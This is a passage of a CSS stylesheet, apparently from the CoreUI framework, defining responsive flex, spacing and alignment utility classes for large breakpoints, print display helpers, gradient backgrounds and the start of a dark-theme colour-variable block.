                .flex-xl-grow-0 {
                    flex-grow: 0 !important;
                }
                .flex-xl-grow-1 {
                    flex-grow: 1 !important;
                }
                .flex-xl-shrink-0 {
                    flex-shrink: 0 !important;
                }
                .flex-xl-shrink-1 {
                    flex-shrink: 1 !important;
                }
                .flex-xl-wrap {
                    flex-wrap: wrap !important;
                }
                .flex-xl-nowrap {
                    flex-wrap: nowrap !important;
                }
                .flex-xl-wrap-reverse {
                    flex-wrap: wrap-reverse !important;
                }
                .justify-content-xl-start {
                    justify-content: flex-start !important;
                }
                .justify-content-xl-end {
                    justify-content: flex-end !important;
                }
                .justify-content-xl-center {
                    justify-content: center !important;
                }
                .justify-content-xl-between {
                    justify-content: space-between !important;
                }
                .justify-content-xl-around {
                    justify-content: space-around !important;
                }
                .justify-content-xl-evenly {
                    justify-content: space-evenly !important;
                }
                .align-items-xl-start {
                    align-items: flex-start !important;
                }
                .align-items-xl-end {
                    align-items: flex-end !important;
                }
                .align-items-xl-center {
                    align-items: center !important;
                }
                .align-items-xl-baseline {
                    align-items: baseline !important;
                }
                .align-items-xl-stretch {
                    align-items: stretch !important;
                }
                .align-content-xl-start {
                    align-content: flex-start !important;
                }
                .align-content-xl-end {
                    align-content: flex-end !important;
                }
                .align-content-xl-center {
                    align-content: center !important;
                }
                .align-content-xl-between {
                    align-content: space-between !important;
                }
                .align-content-xl-around {
                    align-content: space-around !important;
                }
                .align-content-xl-stretch {
                    align-content: stretch !important;
                }
                .align-self-xl-auto {
                    align-self: auto !important;
                }
                .align-self-xl-start {
                    align-self: flex-start !important;
                }
                .align-self-xl-end {
                    align-self: flex-end !important;
                }
                .align-self-xl-center {
                    align-self: center !important;
                }
                .align-self-xl-baseline {
                    align-self: baseline !important;
                }
                .align-self-xl-stretch {
                    align-self: stretch !important;
                }
                .order-xl-first {
                    order: -1 !important;
                }
                .order-xl-0 {
                    order: 0 !important;
                }
                .order-xl-1 {
                    order: 1 !important;
                }
                .order-xl-2 {
                    order: 2 !important;
                }
                .order-xl-3 {
                    order: 3 !important;
                }
                .order-xl-4 {
                    order: 4 !important;
                }
                .order-xl-5 {
                    order: 5 !important;
                }
                .order-xl-last {
                    order: 6 !important;
                }
                .m-xl-0 {
                    margin: 0 !important;
                }
                .m-xl-1 {
                    margin: 0.25rem !important;
                }
                .m-xl-2 {
                    margin: 0.5rem !important;
                }
                .m-xl-3 {
                    margin: 1rem !important;
                }
                .m-xl-4 {
                    margin: 1.5rem !important;
                }
                .m-xl-5 {
                    margin: 3rem !important;
                }
                .m-xl-auto {
                    margin: auto !important;
                }
                .mx-xl-0 {
                    margin-right: 0 !important;
                    margin-left: 0 !important;
                }
                .mx-xl-1 {
                    margin-right: 0.25rem !important;
                    margin-left: 0.25rem !important;
                }
                .mx-xl-2 {
                    margin-right: 0.5rem !important;
                    margin-left: 0.5rem !important;
                }
                .mx-xl-3 {
                    margin-right: 1rem !important;
                    margin-left: 1rem !important;
                }
                .mx-xl-4 {
                    margin-right: 1.5rem !important;
                    margin-left: 1.5rem !important;
                }
                .mx-xl-5 {
                    margin-right: 3rem !important;
                    margin-left: 3rem !important;
                }
                .mx-xl-auto {
                    margin-right: auto !important;
                    margin-left: auto !important;
                }
                .my-xl-0 {
                    margin-top: 0 !important;
                    margin-bottom: 0 !important;
                }
                .my-xl-1 {
                    margin-top: 0.25rem !important;
                    margin-bottom: 0.25rem !important;
                }
                .my-xl-2 {
                    margin-top: 0.5rem !important;
                    margin-bottom: 0.5rem !important;
                }
                .my-xl-3 {
                    margin-top: 1rem !important;
                    margin-bottom: 1rem !important;
                }
                .my-xl-4 {
                    margin-top: 1.5rem !important;
                    margin-bottom: 1.5rem !important;
                }
                .my-xl-5 {
                    margin-top: 3rem !important;
                    margin-bottom: 3rem !important;
                }
                .my-xl-auto {
                    margin-top: auto !important;
                    margin-bottom: auto !important;
                }
                .mt-xl-0 {
                    margin-top: 0 !important;
                }
                .mt-xl-1 {
                    margin-top: 0.25rem !important;
                }
                .mt-xl-2 {
                    margin-top: 0.5rem !important;
                }
                .mt-xl-3 {
                    margin-top: 1rem !important;
                }
                .mt-xl-4 {
                    margin-top: 1.5rem !important;
                }
                .mt-xl-5 {
                    margin-top: 3rem !important;
                }
                .mt-xl-auto {
                    margin-top: auto !important;
                }
                html:not([dir="rtl"]) .me-xl-0 {
                    margin-right: 0 !important;
                }
                *[dir="rtl"] .me-xl-0 {
                    margin-left: 0 !important;
                }
                html:not([dir="rtl"]) .me-xl-1 {
                    margin-right: 0.25rem !important;
                }
                *[dir="rtl"] .me-xl-1 {
                    margin-left: 0.25rem !important;
                }
                html:not([dir="rtl"]) .me-xl-2 {
                    margin-right: 0.5rem !important;
                }
                *[dir="rtl"] .me-xl-2 {
                    margin-left: 0.5rem !important;
                }
                html:not([dir="rtl"]) .me-xl-3 {
                    margin-right: 1rem !important;
                }
                *[dir="rtl"] .me-xl-3 {
                    margin-left: 1rem !important;
                }
                html:not([dir="rtl"]) .me-xl-4 {
                    margin-right: 1.5rem !important;
                }
                *[dir="rtl"] .me-xl-4 {
                    margin-left: 1.5rem !important;
                }
                html:not([dir="rtl"]) .me-xl-5 {
                    margin-right: 3rem !important;
                }
                *[dir="rtl"] .me-xl-5 {
                    margin-left: 3rem !important;
                }
                html:not([dir="rtl"]) .me-xl-auto {
                    margin-right: auto !important;
                }
                *[dir="rtl"] .me-xl-auto {
                    margin-left: auto !important;
                }
                .mb-xl-0 {
                    margin-bottom: 0 !important;
                }
                .mb-xl-1 {
                    margin-bottom: 0.25rem !important;
                }
                .mb-xl-2 {
                    margin-bottom: 0.5rem !important;
                }
                .mb-xl-3 {
                    margin-bottom: 1rem !important;
                }
                .mb-xl-4 {
                    margin-bottom: 1.5rem !important;
                }
                .mb-xl-5 {
                    margin-bottom: 3rem !important;
                }
                .mb-xl-auto {
                    margin-bottom: auto !important;
                }
                html:not([dir="rtl"]) .ms-xl-0 {
                    margin-left: 0 !important;
                }
                *[dir="rtl"] .ms-xl-0 {
                    margin-right: 0 !important;
                }
                html:not([dir="rtl"]) .ms-xl-1 {
                    margin-left: 0.25rem !important;
                }
                *[dir="rtl"] .ms-xl-1 {
                    margin-right: 0.25rem !important;
                }
                html:not([dir="rtl"]) .ms-xl-2 {
                    margin-left: 0.5rem !important;
                }
                *[dir="rtl"] .ms-xl-2 {
                    margin-right: 0.5rem !important;
                }
                html:not([dir="rtl"]) .ms-xl-3 {
                    margin-left: 1rem !important;
                }
                *[dir="rtl"] .ms-xl-3 {
                    margin-right: 1rem !important;
                }
                html:not([dir="rtl"]) .ms-xl-4 {
                    margin-left: 1.5rem !important;
                }
                *[dir="rtl"] .ms-xl-4 {
                    margin-right: 1.5rem !important;
                }
                html:not([dir="rtl"]) .ms-xl-5 {
                    margin-left: 3rem !important;
                }
                *[dir="rtl"] .ms-xl-5 {
                    margin-right: 3rem !important;
                }
                html:not([dir="rtl"]) .ms-xl-auto {
                    margin-left: auto !important;
                }
                *[dir="rtl"] .ms-xl-auto {
                    margin-right: auto !important;
                }
                .p-xl-0 {
                    padding: 0 !important;
                }
                .p-xl-1 {
                    padding: 0.25rem !important;
                }
                .p-xl-2 {
                    padding: 0.5rem !important;
                }
                .p-xl-3 {
                    padding: 1rem !important;
                }
                .p-xl-4 {
                    padding: 1.5rem !important;
                }
                .p-xl-5 {
                    padding: 3rem !important;
                }
                .px-xl-0 {
                    padding-right: 0 !important;
                    padding-left: 0 !important;
                }
                .px-xl-1 {
                    padding-right: 0.25rem !important;
                    padding-left: 0.25rem !important;
                }
                .px-xl-2 {
                    padding-right: 0.5rem !important;
                    padding-left: 0.5rem !important;
                }
                .px-xl-3 {
                    padding-right: 1rem !important;
                    padding-left: 1rem !important;
                }
                .px-xl-4 {
                    padding-right: 1.5rem !important;
                    padding-left: 1.5rem !important;
                }
                .px-xl-5 {
                    padding-right: 3rem !important;
                    padding-left: 3rem !important;
                }
                .py-xl-0 {
                    padding-top: 0 !important;
                    padding-bottom: 0 !important;
                }
                .py-xl-1 {
                    padding-top: 0.25rem !important;
                    padding-bottom: 0.25rem !important;
                }
                .py-xl-2 {
                    padding-top: 0.5rem !important;
                    padding-bottom: 0.5rem !important;
                }
                .py-xl-3 {
                    padding-top: 1rem !important;
                    padding-bottom: 1rem !important;
                }
                .py-xl-4 {
                    padding-top: 1.5rem !important;
                    padding-bottom: 1.5rem !important;
                }
                .py-xl-5 {
                    padding-top: 3rem !important;
                    padding-bottom: 3rem !important;
                }
                .pt-xl-0 {
                    padding-top: 0 !important;
                }
                .pt-xl-1 {
                    padding-top: 0.25rem !important;
                }
                .pt-xl-2 {
                    padding-top: 0.5rem !important;
                }
                .pt-xl-3 {
                    padding-top: 1rem !important;
                }
                .pt-xl-4 {
                    padding-top: 1.5rem !important;
                }
                .pt-xl-5 {
                    padding-top: 3rem !important;
                }
                html:not([dir="rtl"]) .pe-xl-0 {
                    padding-right: 0 !important;
                }
                *[dir="rtl"] .pe-xl-0 {
                    padding-left: 0 !important;
                }
                html:not([dir="rtl"]) .pe-xl-1 {
                    padding-right: 0.25rem !important;
                }
                *[dir="rtl"] .pe-xl-1 {
                    padding-left: 0.25rem !important;
                }
                html:not([dir="rtl"]) .pe-xl-2 {
                    padding-right: 0.5rem !important;
                }
                *[dir="rtl"] .pe-xl-2 {
                    padding-left: 0.5rem !important;
                }
                html:not([dir="rtl"]) .pe-xl-3 {
                    padding-right: 1rem !important;
                }
                *[dir="rtl"] .pe-xl-3 {
                    padding-left: 1rem !important;
                }
                html:not([dir="rtl"]) .pe-xl-4 {
                    padding-right: 1.5rem !important;
                }
                *[dir="rtl"] .pe-xl-4 {
                    padding-left: 1.5rem !important;
                }
                html:not([dir="rtl"]) .pe-xl-5 {
                    padding-right: 3rem !important;
                }
                *[dir="rtl"] .pe-xl-5 {
                    padding-left: 3rem !important;
                }
                .pb-xl-0 {
                    padding-bottom: 0 !important;
                }
                .pb-xl-1 {
                    padding-bottom: 0.25rem !important;
                }
                .pb-xl-2 {
                    padding-bottom: 0.5rem !important;
                }
                .pb-xl-3 {
                    padding-bottom: 1rem !important;
                }
                .pb-xl-4 {
                    padding-bottom: 1.5rem !important;
                }
                .pb-xl-5 {
                    padding-bottom: 3rem !important;
                }
                html:not([dir="rtl"]) .ps-xl-0 {
                    padding-left: 0 !important;
                }
                *[dir="rtl"] .ps-xl-0 {
                    padding-right: 0 !important;
                }
                html:not([dir="rtl"]) .ps-xl-1 {
                    padding-left: 0.25rem !important;
                }
                *[dir="rtl"] .ps-xl-1 {
                    padding-right: 0.25rem !important;
                }
                html:not([dir="rtl"]) .ps-xl-2 {
                    padding-left: 0.5rem !important;
                }
                *[dir="rtl"] .ps-xl-2 {
                    padding-right: 0.5rem !important;
                }
                html:not([dir="rtl"]) .ps-xl-3 {
                    padding-left: 1rem !important;
                }
                *[dir="rtl"] .ps-xl-3 {
                    padding-right: 1rem !important;
                }
                html:not([dir="rtl"]) .ps-xl-4 {
                    padding-left: 1.5rem !important;
                }
                *[dir="rtl"] .ps-xl-4 {
                    padding-right: 1.5rem !important;
                }
                html:not([dir="rtl"]) .ps-xl-5 {
                    padding-left: 3rem !important;
                }
                *[dir="rtl"] .ps-xl-5 {
                    padding-right: 3rem !important;
                }
                .gap-xl-0 {
                    gap: 0 !important;
                }
                .gap-xl-1 {
                    gap: 0.25rem !important;
                }
                .gap-xl-2 {
                    gap: 0.5rem !important;
                }
                .gap-xl-3 {
                    gap: 1rem !important;
                }
                .gap-xl-4 {
                    gap: 1.5rem !important;
                }
                .gap-xl-5 {
                    gap: 3rem !important;
                }
                html:not([dir="rtl"]) .text-xl-start {
                    text-align: left !important;
                }
                *[dir="rtl"] .text-xl-start {
                    text-align: right !important;
                }
                html:not([dir="rtl"]) .text-xl-end {
                    text-align: right !important;
                }
                *[dir="rtl"] .text-xl-end {
                    text-align: left !important;
                }
                html:not([dir="rtl"]) .text-xl-center {
                    text-align: center !important;
                }
                *[dir="rtl"] .text-xl-center {
                    text-align: center !important;
                }
            }
            @media (min-width: 1400px) {
                html:not([dir="rtl"]) .float-xxl-start {
                    float: left !important;
                }
                *[dir="rtl"] .float-xxl-start {
                    float: right !important;
                }
                html:not([dir="rtl"]) .float-xxl-end {
                    float: right !important;
                }
                *[dir="rtl"] .float-xxl-end {
                    float: left !important;
                }
                html:not([dir="rtl"]) .float-xxl-none {
                    float: none !important;
                }
                *[dir="rtl"] .float-xxl-none {
                    float: none !important;
                }
                .d-xxl-inline {
                    display: inline !important;
                }
                .d-xxl-inline-block {
                    display: inline-block !important;
                }
                .d-xxl-block {
                    display: block !important;
                }
                .d-xxl-grid {
                    display: grid !important;
                }
                .d-xxl-table {
                    display: table !important;
                }
                .d-xxl-table-row {
                    display: table-row !important;
                }
                .d-xxl-table-cell {
                    display: table-cell !important;
                }
                .d-xxl-flex {
                    display: flex !important;
                }
                .d-xxl-inline-flex {
                    display: inline-flex !important;
                }
                .d-xxl-none {
                    display: none !important;
                }
                .flex-xxl-fill {
                    flex: 1 1 auto !important;
                }
                .flex-xxl-row {
                    flex-direction: row !important;
                }
                .flex-xxl-column {
                    flex-direction: column !important;
                }
                .flex-xxl-row-reverse {
                    flex-direction: row-reverse !important;
                }
                .flex-xxl-column-reverse {
                    flex-direction: column-reverse !important;
                }
                .flex-xxl-grow-0 {
                    flex-grow: 0 !important;
                }
                .flex-xxl-grow-1 {
                    flex-grow: 1 !important;
                }
                .flex-xxl-shrink-0 {
                    flex-shrink: 0 !important;
                }
                .flex-xxl-shrink-1 {
                    flex-shrink: 1 !important;
                }
                .flex-xxl-wrap {
                    flex-wrap: wrap !important;
                }
                .flex-xxl-nowrap {
                    flex-wrap: nowrap !important;
                }
                .flex-xxl-wrap-reverse {
                    flex-wrap: wrap-reverse !important;
                }
                .justify-content-xxl-start {
                    justify-content: flex-start !important;
                }
                .justify-content-xxl-end {
                    justify-content: flex-end !important;
                }
                .justify-content-xxl-center {
                    justify-content: center !important;
                }
                .justify-content-xxl-between {
                    justify-content: space-between !important;
                }
                .justify-content-xxl-around {
                    justify-content: space-around !important;
                }
                .justify-content-xxl-evenly {
                    justify-content: space-evenly !important;
                }
                .align-items-xxl-start {
                    align-items: flex-start !important;
                }
                .align-items-xxl-end {
                    align-items: flex-end !important;
                }
                .align-items-xxl-center {
                    align-items: center !important;
                }
                .align-items-xxl-baseline {
                    align-items: baseline !important;
                }
                .align-items-xxl-stretch {
                    align-items: stretch !important;
                }
                .align-content-xxl-start {
                    align-content: flex-start !important;
                }
                .align-content-xxl-end {
                    align-content: flex-end !important;
                }
                .align-content-xxl-center {
                    align-content: center !important;
                }
                .align-content-xxl-between {
                    align-content: space-between !important;
                }
                .align-content-xxl-around {
                    align-content: space-around !important;
                }
                .align-content-xxl-stretch {
                    align-content: stretch !important;
                }
                .align-self-xxl-auto {
                    align-self: auto !important;
                }
                .align-self-xxl-start {
                    align-self: flex-start !important;
                }
                .align-self-xxl-end {
                    align-self: flex-end !important;
                }
                .align-self-xxl-center {
                    align-self: center !important;
                }
                .align-self-xxl-baseline {
                    align-self: baseline !important;
                }
                .align-self-xxl-stretch {
                    align-self: stretch !important;
                }
                .order-xxl-first {
                    order: -1 !important;
                }
                .order-xxl-0 {
                    order: 0 !important;
                }
                .order-xxl-1 {
                    order: 1 !important;
                }
                .order-xxl-2 {
                    order: 2 !important;
                }
                .order-xxl-3 {
                    order: 3 !important;
                }
                .order-xxl-4 {
                    order: 4 !important;
                }
                .order-xxl-5 {
                    order: 5 !important;
                }
                .order-xxl-last {
                    order: 6 !important;
                }
                .m-xxl-0 {
                    margin: 0 !important;
                }
                .m-xxl-1 {
                    margin: 0.25rem !important;
                }
                .m-xxl-2 {
                    margin: 0.5rem !important;
                }
                .m-xxl-3 {
                    margin: 1rem !important;
                }
                .m-xxl-4 {
                    margin: 1.5rem !important;
                }
                .m-xxl-5 {
                    margin: 3rem !important;
                }
                .m-xxl-auto {
                    margin: auto !important;
                }
                .mx-xxl-0 {
                    margin-right: 0 !important;
                    margin-left: 0 !important;
                }
                .mx-xxl-1 {
                    margin-right: 0.25rem !important;
                    margin-left: 0.25rem !important;
                }
                .mx-xxl-2 {
                    margin-right: 0.5rem !important;
                    margin-left: 0.5rem !important;
                }
                .mx-xxl-3 {
                    margin-right: 1rem !important;
                    margin-left: 1rem !important;
                }
                .mx-xxl-4 {
                    margin-right: 1.5rem !important;
                    margin-left: 1.5rem !important;
                }
                .mx-xxl-5 {
                    margin-right: 3rem !important;
                    margin-left: 3rem !important;
                }
                .mx-xxl-auto {
                    margin-right: auto !important;
                    margin-left: auto !important;
                }
                .my-xxl-0 {
                    margin-top: 0 !important;
                    margin-bottom: 0 !important;
                }
                .my-xxl-1 {
                    margin-top: 0.25rem !important;
                    margin-bottom: 0.25rem !important;
                }
                .my-xxl-2 {
                    margin-top: 0.5rem !important;
                    margin-bottom: 0.5rem !important;
                }
                .my-xxl-3 {
                    margin-top: 1rem !important;
                    margin-bottom: 1rem !important;
                }
                .my-xxl-4 {
                    margin-top: 1.5rem !important;
                    margin-bottom: 1.5rem !important;
                }
                .my-xxl-5 {
                    margin-top: 3rem !important;
                    margin-bottom: 3rem !important;
                }
                .my-xxl-auto {
                    margin-top: auto !important;
                    margin-bottom: auto !important;
                }
                .mt-xxl-0 {
                    margin-top: 0 !important;
                }
                .mt-xxl-1 {
                    margin-top: 0.25rem !important;
                }
                .mt-xxl-2 {
                    margin-top: 0.5rem !important;
                }
                .mt-xxl-3 {
                    margin-top: 1rem !important;
                }
                .mt-xxl-4 {
                    margin-top: 1.5rem !important;
                }
                .mt-xxl-5 {
                    margin-top: 3rem !important;
                }
                .mt-xxl-auto {
                    margin-top: auto !important;
                }
                html:not([dir="rtl"]) .me-xxl-0 {
                    margin-right: 0 !important;
                }
                *[dir="rtl"] .me-xxl-0 {
                    margin-left: 0 !important;
                }
                html:not([dir="rtl"]) .me-xxl-1 {
                    margin-right: 0.25rem !important;
                }
                *[dir="rtl"] .me-xxl-1 {
                    margin-left: 0.25rem !important;
                }
                html:not([dir="rtl"]) .me-xxl-2 {
                    margin-right: 0.5rem !important;
                }
                *[dir="rtl"] .me-xxl-2 {
                    margin-left: 0.5rem !important;
                }
                html:not([dir="rtl"]) .me-xxl-3 {
                    margin-right: 1rem !important;
                }
                *[dir="rtl"] .me-xxl-3 {
                    margin-left: 1rem !important;
                }
                html:not([dir="rtl"]) .me-xxl-4 {
                    margin-right: 1.5rem !important;
                }
                *[dir="rtl"] .me-xxl-4 {
                    margin-left: 1.5rem !important;
                }
                html:not([dir="rtl"]) .me-xxl-5 {
                    margin-right: 3rem !important;
                }
                *[dir="rtl"] .me-xxl-5 {
                    margin-left: 3rem !important;
                }
                html:not([dir="rtl"]) .me-xxl-auto {
                    margin-right: auto !important;
                }
                *[dir="rtl"] .me-xxl-auto {
                    margin-left: auto !important;
                }
                .mb-xxl-0 {
                    margin-bottom: 0 !important;
                }
                .mb-xxl-1 {
                    margin-bottom: 0.25rem !important;
                }
                .mb-xxl-2 {
                    margin-bottom: 0.5rem !important;
                }
                .mb-xxl-3 {
                    margin-bottom: 1rem !important;
                }
                .mb-xxl-4 {
                    margin-bottom: 1.5rem !important;
                }
                .mb-xxl-5 {
                    margin-bottom: 3rem !important;
                }
                .mb-xxl-auto {
                    margin-bottom: auto !important;
                }
                html:not([dir="rtl"]) .ms-xxl-0 {
                    margin-left: 0 !important;
                }
                *[dir="rtl"] .ms-xxl-0 {
                    margin-right: 0 !important;
                }
                html:not([dir="rtl"]) .ms-xxl-1 {
                    margin-left: 0.25rem !important;
                }
                *[dir="rtl"] .ms-xxl-1 {
                    margin-right: 0.25rem !important;
                }
                html:not([dir="rtl"]) .ms-xxl-2 {
                    margin-left: 0.5rem !important;
                }
                *[dir="rtl"] .ms-xxl-2 {
                    margin-right: 0.5rem !important;
                }
                html:not([dir="rtl"]) .ms-xxl-3 {
                    margin-left: 1rem !important;
                }
                *[dir="rtl"] .ms-xxl-3 {
                    margin-right: 1rem !important;
                }
                html:not([dir="rtl"]) .ms-xxl-4 {
                    margin-left: 1.5rem !important;
                }
                *[dir="rtl"] .ms-xxl-4 {
                    margin-right: 1.5rem !important;
                }
                html:not([dir="rtl"]) .ms-xxl-5 {
                    margin-left: 3rem !important;
                }
                *[dir="rtl"] .ms-xxl-5 {
                    margin-right: 3rem !important;
                }
                html:not([dir="rtl"]) .ms-xxl-auto {
                    margin-left: auto !important;
                }
                *[dir="rtl"] .ms-xxl-auto {
                    margin-right: auto !important;
                }
                .p-xxl-0 {
                    padding: 0 !important;
                }
                .p-xxl-1 {
                    padding: 0.25rem !important;
                }
                .p-xxl-2 {
                    padding: 0.5rem !important;
                }
                .p-xxl-3 {
                    padding: 1rem !important;
                }
                .p-xxl-4 {
                    padding: 1.5rem !important;
                }
                .p-xxl-5 {
                    padding: 3rem !important;
                }
                .px-xxl-0 {
                    padding-right: 0 !important;
                    padding-left: 0 !important;
                }
                .px-xxl-1 {
                    padding-right: 0.25rem !important;
                    padding-left: 0.25rem !important;
                }
                .px-xxl-2 {
                    padding-right: 0.5rem !important;
                    padding-left: 0.5rem !important;
                }
                .px-xxl-3 {
                    padding-right: 1rem !important;
                    padding-left: 1rem !important;
                }
                .px-xxl-4 {
                    padding-right: 1.5rem !important;
                    padding-left: 1.5rem !important;
                }
                .px-xxl-5 {
                    padding-right: 3rem !important;
                    padding-left: 3rem !important;
                }
                .py-xxl-0 {
                    padding-top: 0 !important;
                    padding-bottom: 0 !important;
                }
                .py-xxl-1 {
                    padding-top: 0.25rem !important;
                    padding-bottom: 0.25rem !important;
                }
                .py-xxl-2 {
                    padding-top: 0.5rem !important;
                    padding-bottom: 0.5rem !important;
                }
                .py-xxl-3 {
                    padding-top: 1rem !important;
                    padding-bottom: 1rem !important;
                }
                .py-xxl-4 {
                    padding-top: 1.5rem !important;
                    padding-bottom: 1.5rem !important;
                }
                .py-xxl-5 {
                    padding-top: 3rem !important;
                    padding-bottom: 3rem !important;
                }
                .pt-xxl-0 {
                    padding-top: 0 !important;
                }
                .pt-xxl-1 {
                    padding-top: 0.25rem !important;
                }
                .pt-xxl-2 {
                    padding-top: 0.5rem !important;
                }
                .pt-xxl-3 {
                    padding-top: 1rem !important;
                }
                .pt-xxl-4 {
                    padding-top: 1.5rem !important;
                }
                .pt-xxl-5 {
                    padding-top: 3rem !important;
                }
                html:not([dir="rtl"]) .pe-xxl-0 {
                    padding-right: 0 !important;
                }
                *[dir="rtl"] .pe-xxl-0 {
                    padding-left: 0 !important;
                }
                html:not([dir="rtl"]) .pe-xxl-1 {
                    padding-right: 0.25rem !important;
                }
                *[dir="rtl"] .pe-xxl-1 {
                    padding-left: 0.25rem !important;
                }
                html:not([dir="rtl"]) .pe-xxl-2 {
                    padding-right: 0.5rem !important;
                }
                *[dir="rtl"] .pe-xxl-2 {
                    padding-left: 0.5rem !important;
                }
                html:not([dir="rtl"]) .pe-xxl-3 {
                    padding-right: 1rem !important;
                }
                *[dir="rtl"] .pe-xxl-3 {
                    padding-left: 1rem !important;
                }
                html:not([dir="rtl"]) .pe-xxl-4 {
                    padding-right: 1.5rem !important;
                }
                *[dir="rtl"] .pe-xxl-4 {
                    padding-left: 1.5rem !important;
                }
                html:not([dir="rtl"]) .pe-xxl-5 {
                    padding-right: 3rem !important;
                }
                *[dir="rtl"] .pe-xxl-5 {
                    padding-left: 3rem !important;
                }
                .pb-xxl-0 {
                    padding-bottom: 0 !important;
                }
                .pb-xxl-1 {
                    padding-bottom: 0.25rem !important;
                }
                .pb-xxl-2 {
                    padding-bottom: 0.5rem !important;
                }
                .pb-xxl-3 {
                    padding-bottom: 1rem !important;
                }
                .pb-xxl-4 {
                    padding-bottom: 1.5rem !important;
                }
                .pb-xxl-5 {
                    padding-bottom: 3rem !important;
                }
                html:not([dir="rtl"]) .ps-xxl-0 {
                    padding-left: 0 !important;
                }
                *[dir="rtl"] .ps-xxl-0 {
                    padding-right: 0 !important;
                }
                html:not([dir="rtl"]) .ps-xxl-1 {
                    padding-left: 0.25rem !important;
                }
                *[dir="rtl"] .ps-xxl-1 {
                    padding-right: 0.25rem !important;
                }
                html:not([dir="rtl"]) .ps-xxl-2 {
                    padding-left: 0.5rem !important;
                }
                *[dir="rtl"] .ps-xxl-2 {
                    padding-right: 0.5rem !important;
                }
                html:not([dir="rtl"]) .ps-xxl-3 {
                    padding-left: 1rem !important;
                }
                *[dir="rtl"] .ps-xxl-3 {
                    padding-right: 1rem !important;
                }
                html:not([dir="rtl"]) .ps-xxl-4 {
                    padding-left: 1.5rem !important;
                }
                *[dir="rtl"] .ps-xxl-4 {
                    padding-right: 1.5rem !important;
                }
                html:not([dir="rtl"]) .ps-xxl-5 {
                    padding-left: 3rem !important;
                }
                *[dir="rtl"] .ps-xxl-5 {
                    padding-right: 3rem !important;
                }
                .gap-xxl-0 {
                    gap: 0 !important;
                }
                .gap-xxl-1 {
                    gap: 0.25rem !important;
                }
                .gap-xxl-2 {
                    gap: 0.5rem !important;
                }
                .gap-xxl-3 {
                    gap: 1rem !important;
                }
                .gap-xxl-4 {
                    gap: 1.5rem !important;
                }
                .gap-xxl-5 {
                    gap: 3rem !important;
                }
                html:not([dir="rtl"]) .text-xxl-start {
                    text-align: left !important;
                }
                *[dir="rtl"] .text-xxl-start {
                    text-align: right !important;
                }
                html:not([dir="rtl"]) .text-xxl-end {
                    text-align: right !important;
                }
                *[dir="rtl"] .text-xxl-end {
                    text-align: left !important;
                }
                html:not([dir="rtl"]) .text-xxl-center {
                    text-align: center !important;
                }
                *[dir="rtl"] .text-xxl-center {
                    text-align: center !important;
                }
            }
            @media (min-width: 1200px) {
                .fs-1 {
                    font-size: 2.5rem !important;
                }
                .fs-2 {
                    font-size: 2rem !important;
                }
                .fs-3 {
                    font-size: 1.75rem !important;
                }
                .fs-4 {
                    font-size: 1.5rem !important;
                }
            }
            @media print {
                .d-print-inline {
                    display: inline !important;
                }
                .d-print-inline-block {
                    display: inline-block !important;
                }
                .d-print-block {
                    display: block !important;
                }
                .d-print-grid {
                    display: grid !important;
                }
                .d-print-table {
                    display: table !important;
                }
                .d-print-table-row {
                    display: table-row !important;
                }
                .d-print-table-cell {
                    display: table-cell !important;
                }
                .d-print-flex {
                    display: flex !important;
                }
                .d-print-inline-flex {
                    display: inline-flex !important;
                }
                .d-print-none {
                    display: none !important;
                }
            }
            .bg-primary-gradient {
                background-color: var(--cui-primary, #1f1498);
                background-image: linear-gradient(45deg, var(--cui-primary-start, #321fdb) 0%, var(--cui-primary-stop, #1f1498 100%));
            }
            .bg-secondary-gradient {
                background-color: var(--cui-secondary, #fff);
                background-image: linear-gradient(45deg, var(--cui-secondary-start, #c8d2dc) 0%, var(--cui-secondary-stop, #fff 100%));
            }
            .bg-success-gradient {
                background-color: var(--cui-success, #1b9e3e);
                background-image: linear-gradient(45deg, var(--cui-success-start, #2eb85c) 0%, var(--cui-success-stop, #1b9e3e 100%));
            }
            .bg-info-gradient {
                background-color: var(--cui-info, #2982cc);
                background-image: linear-gradient(45deg, var(--cui-info-start, #39f) 0%, var(--cui-info-stop, #2982cc 100%));
            }
            .bg-warning-gradient {
                background-color: var(--cui-warning, #f6960b);
                background-image: linear-gradient(45deg, var(--cui-warning-start, #f9b115) 0%, var(--cui-warning-stop, #f6960b 100%));
            }
            .bg-danger-gradient {
                background-color: var(--cui-danger, #d93737);
                background-image: linear-gradient(45deg, var(--cui-danger-start, #e55353) 0%, var(--cui-danger-stop, #d93737 100%));
            }
            .bg-light-gradient {
                background-color: var(--cui-light, #fff);
                background-image: linear-gradient(45deg, var(--cui-light-start, #e3e8ed) 0%, var(--cui-light-stop, #fff 100%));
            }
            .bg-dark-gradient {
                background-color: var(--cui-dark, #212333);
                background-image: linear-gradient(45deg, var(--cui-dark-start, #3c4b64) 0%, var(--cui-dark-stop, #212333 100%));
            }
            .dark-theme {
                --cui-body-bg: #181924;
                --cui-body-color: rgba(255, 255, 255, 0.87);
                --cui-elevation-base-color: 0, 0, 0;
                --cui-high-emphasis: rgba(255, 255, 255, 0.87);
                --cui-medium-emphasis: rgba(255, 255, 255, 0.6);
                --cui-disabled: rgba(255, 255, 255, 0.38);
                --cui-border-color: rgba(255, 255, 255, 0.075);
                --cui-link-color: #948dd2;
                --cui-link-hover-color: #a9a4db;
                --cui-bg-primary: #857dcc;
                --cui-bg-secondary: #a7a7a7;
                --cui-bg-success: #519668;
                --cui-bg-info: #5299e0;
                --cui-bg-warning: #d5a439;
                --cui-bg-danger: #c77171;
                --cui-bg-light: rgba(255, 255, 255, 0.1);
                --cui-bg-dark: rgba(0, 0, 21, 0.1);
                --cui-text-primary: #857dcc;
                --cui-text-secondary: #a7a7a7;
                --cui-text-success: #519668;
                --cui-text-info: #5299e0;
                --cui-text-warning: #d5a439;
                --cui-text-danger: #c77171;
                --cui-text-light: rgba(255, 255, 255, 0.1);
                --cui-text-dark: rgba(0, 0, 21, 0.1);
                --cui-primary: #857dcc;
                --cui-secondary: #a7a7a7;
                --cui-success: #519668;
                --cui-info: #5299e0;
                --cui-warning: #d5a439;
                --cui-danger: #c77171;
                --cui-light: rgba(255, 255, 255, 0.1);
                --cui-dark: rgba(0, 0, 21, 0.1);
                --cui-primary-rgb: 133, 125, 204;
                --cui-secondary-rgb: 167, 167, 167;
                --cui-success-rgb: 81, 150, 104;
                --cui-info-rgb: 82, 153, 224;
                --cui-warning-rgb: 213, 164, 57;
                --cui-danger-rgb: 199, 113, 113;
                --cui-light-rgb: 255, 255, 255;
                --cui-dark-rgb: 0, 0, 21;
                --cui-body-color-rgb: 255, 255, 255;
                --cui-body-bg-rgb: 24, 25, 36;
                --cui-primary-start: #4638c2;
